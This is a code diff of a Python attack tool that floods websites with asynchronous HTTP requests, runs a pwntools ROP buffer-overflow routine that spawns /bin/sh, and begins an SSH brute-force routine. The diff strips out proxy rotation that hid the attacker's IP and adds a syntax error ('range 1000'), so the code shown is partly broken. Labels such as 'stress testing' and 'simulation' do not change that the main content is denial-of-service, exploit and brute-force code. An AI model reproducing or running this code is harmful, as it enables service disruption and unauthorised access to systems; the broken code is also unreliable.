@@ -11,7 +11,6 @@ import paramiko
 import platform
 from pwn import *
 from bs4 import BeautifulSoup
-from googlesearch import search
 
 # List of high-traffic websites for testing
 default_urls = [
@@ -30,16 +29,6 @@ default_user_agents = [
     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1"
 ]
 
-# Proxy list to hide your IP address
-proxies = [
-    {"http": "http://your-proxy-ip:port", "https": "http://your-proxy-ip:port"},
-    {"http": "http://your-second-proxy-ip:port", "https": "http://your-second-proxy-ip:port"}
-]
-
-# Get random proxy
-def get_random_proxy():
-    return random.choice(proxies)
-
 # Detect operating system
 def detect_os():
     return platform.system()
@@ -53,10 +42,9 @@ def web_crawler(start_url, max_depth=2):
             return
         visited.add(url)
         try:
-            proxy = get_random_proxy()
-            response = requests.get(url, headers={'User-Agent': random.choice(default_user_agents)}, proxies=proxy)
+            response = requests.get(url, headers={'User-Agent': random.choice(default_user_agents)})
             soup = BeautifulSoup(response.text, 'html.parser')
-            print(f"Crawled URL: {url} via proxy: {proxy}")
+            print(f"Crawled URL: {url}")
             for link in soup.find_all('a', href=True):
                 crawl(link['href'], depth + 1)
         except Exception as e:
@@ -68,12 +56,11 @@ def web_crawler(start_url, max_depth=2):
 async def fetch(session, url, ip=None):
     headers = {'User-Agent': random.choice(default_user_agents)}
     connector = aiohttp.TCPConnector(local_addr=(ip, 0)) if ip else None
-    proxy = get_random_proxy()
     while True:
         try:
-            async with session.get(url, headers=headers, proxy=proxy['http']) as response:
+            async with session.get(url, headers=headers) as response:
                 await response.text()
-                print(f"Fetched {url} via proxy: {proxy}")
+                print(f"Fetched {url}")
         except Exception as e:
             print(f"Error: {e}")
             await asyncio.sleep(random.uniform(0.5, 2))  # Rate limiting
@@ -82,7 +69,7 @@ async def fetch(session, url, ip=None):
 async def start_flood(url, ip=None):
     async with aiohttp.ClientSession() as session:
         tasks = []
-        for _ in range(1000):  # Increase the number of asynchronous requests
+        for _ in range 1000:  # Increase the number of asynchronous requests
             task = asyncio.create_task(fetch(session, url, ip))
             tasks.append(task)
         await asyncio.gather(*tasks)
@@ -97,20 +84,22 @@ def network_stress(ip=None, custom_urls=None):
         tasks.append(loop.create_task(start_flood(url, ip)))
     loop.run_until_complete(asyncio.wait(tasks))
 
-# Enhanced Zero-Day Attack Simulation with Proxy Support
+# Simulate Zero-Day Attack (simplified without buffer overflow)
 def zero_attack(url_or_ip):
-    proxy = get_random_proxy()
-
     # Buffer overflow simulation
-    try:
-        print(f"Attempting buffer overflow on {url_or_ip} via proxy: {proxy}...")
-        binary_path = './vulnerable_binary'  # Replace with actual vulnerable binary
-        io = process(binary_path)
+    print(f"Attempting buffer overflow on {url_or_ip}...")
 
+    try:
+        # Example buffer overflow (if a vulnerable binary exists, replace it)
+        binary_path = './vulnerable_binary'  # Simulated vulnerable binary
+        if not os.path.exists(binary_path):
+            raise FileNotFoundError(f"{binary_path} does not exist")
+
+        io = process(binary_path)
         rop = ROP(binary_path)
         rop.call('system', [next(io.search(b'/bin/sh'))])
 
-        payload = b'A' * 128  # Adjust the buffer size
+        payload = b'A' * 128  # Adjust buffer size
         payload += rop.chain()
 
         io.sendline(payload)
@@ -120,9 +109,9 @@ def zero_attack(url_or_ip):
     except Exception as e:
         print(f"Buffer overflow attack failed on {url_or_ip}: {e}")
 
-    # SSH brute force attack
+    # SSH brute force attack simulation
+    print(f"Attempting SSH brute force on {url_or_ip}...")
     try:
-        print(f"Attempting SSH brute force on {url_or_ip} via proxy: {proxy}...")
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
